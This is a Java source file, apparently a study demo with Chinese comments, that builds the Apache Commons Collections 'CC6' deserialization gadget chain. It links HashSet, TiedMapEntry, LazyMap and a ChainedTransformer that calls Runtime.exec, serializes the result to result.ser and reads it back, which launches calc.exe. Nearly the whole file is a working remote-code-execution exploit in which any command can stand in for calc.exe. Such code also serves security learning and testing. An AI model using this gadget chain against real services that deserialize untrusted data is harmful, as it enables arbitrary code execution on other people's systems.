package org.example.cc;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;

// 通过TiedMapEntry#hashCode触发TiedMapEntry#getValue，从而触发LazyMap#get
public class cc6Demo1 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec",new Class[] { String.class }, new Object[]{"calc.exe"})
        });

        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);

        TiedMapEntry tiedmap = new TiedMapEntry(map,123);

        HashSet hashset = new HashSet(1);
        hashset.add("foo");
        // 获取HashSet的map属性
        Field field = Class.forName("java.util.HashSet").getDeclaredField("map");//getDeclaredField 获取公有成员
        field.setAccessible(true);
        HashMap hashset_map = (HashMap) field.get(hashset);
        System.out.println(hashset_map);
        /*
        //方法:get(Object obj) 返回指定对象obj上此 Field 表示的字段的值
        http://www.51gjie.com/java/795.html
         */


        // 获取HashMap的table属性中第一个元素对象。是Entry类型。赋值给node
        Field table = Class.forName("java.util.HashMap").getDeclaredField("table");
        table.setAccessible(true);
        Object[] array = (Object[])table.get(hashset_map);
        Object node = array[0];
        // 将node的key修改为Tiedmap对象。即HashSet中的map属性第一个元素的key为tiedmap对象。
        Field key = node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node,tiedmap);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./result.ser"));
            outputStream.writeObject(hashset);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./result.ser"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}

